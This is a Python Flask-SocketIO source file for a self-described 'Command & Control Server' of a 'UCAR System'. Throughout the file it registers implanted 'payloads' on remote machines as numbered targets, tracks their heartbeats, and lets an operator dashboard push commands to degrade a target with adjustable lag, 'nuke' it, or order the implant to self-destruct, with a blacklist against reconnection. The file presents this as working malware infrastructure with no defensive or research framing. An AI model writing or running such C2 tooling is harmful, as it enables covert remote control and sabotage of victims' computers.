# UCAR System: Command & Control Server
# Author: Sigma

import os

# --- EVENTLET CONFIGURATION ---
if __name__ == "__main__":
    import eventlet
    eventlet.monkey_patch()

from flask import Flask
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

# --- Data Store ---
sessions = {}
blacklist = set()

@app.route('/')
def health_check():
    return "UCAR C2 Server is Operational", 200

def check_offline_sessions():
    """Background task to mark sessions as offline if they miss heartbeats."""
    while True:
        socketio.sleep(10)
        now = time.time()
        changed = False
        for sid, data in sessions.items():
            if data['status'] == 'online' and now - data['last_seen'] > 30:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed:
            socketio.emit('session_list_update', sessions, namespace='/dashboard')

socketio.start_background_task(check_offline_sessions)

# --- Dashboard Namespace ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    """Send current list to dashboard upon connection."""
    emit('session_list_update', sessions)

@socketio.on('update_lag_state', namespace='/dashboard')
def handle_lag(data):
    sid = data.get('session_id')
    status = data.get('status')
    intensity = data.get('intensity')
    if sid in sessions:
        sessions[sid]['lag_status'] = status
        sessions[sid]['lag_intensity'] = intensity
        socketio.emit('command_update_lag', {'status': status, 'intensity': intensity}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('delete_session', namespace='/dashboard')
def delete_session(data):
    sid = data.get('session_id')
    if sid:
        print(f"Server: Issuing KILL to {sid} and adding to blacklist.")
        blacklist.add(sid)
        socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
        if sid in sessions:
            del sessions[sid]
            emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('nuke_session', namespace='/dashboard')
def nuke_session(data):
    sid = data.get('session_id')
    if sid in sessions:
        print(f"Server: Issuing NUKE to {sid}")
        socketio.emit('command_nuke', {}, namespace='/payload', room=sid)
        del sessions[sid]
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

# --- NEW EVENT HANDLER ---
@socketio.on('clear_blacklist', namespace='/dashboard')
def clear_blacklist(data):
    """
    Clears the server-side blacklist of session IDs.
    Allows previously killed payloads to reconnect.
    """
    print("Server: Received request to clear blacklist.")
    blacklist.clear()
    print("Server: Blacklist has been cleared.")

# --- Payload Namespace ---

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    """Handle new connections from payloads."""
    sid = data.get('session_id')
    if not sid: return
    
    if sid in blacklist:
        print(f"Server: Blacklisted payload {sid} attempted connection. Re-issuing self-destruct.")
        join_room(sid)
        emit('command_self_destruct', {}, namespace='/payload', room=sid)
        return

    join_room(sid)
    
    if sid not in sessions:
        sessions[sid] = {
            'nametag': f'Target-{sid[:4]}', 
            'status': 'online', 
            'last_seen': time.time(), 
            'lag_status': 'off',
            'lag_intensity': 5
        }
    else:
        sessions[sid]['status'] = 'online'
        sessions[sid]['last_seen'] = time.time()
        
    socketio.emit('session_list_update', sessions, namespace='/dashboard')
    
    emit('command_update_lag', {
        'status': sessions[sid]['lag_status'], 
        'intensity': sessions[sid]['lag_intensity']
    }, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    """Keep-alive signal from payload."""
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['last_seen'] = time.time()
    elif sid in blacklist:
        emit('command_self_destruct', {}, namespace='/payload', room=sid)

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
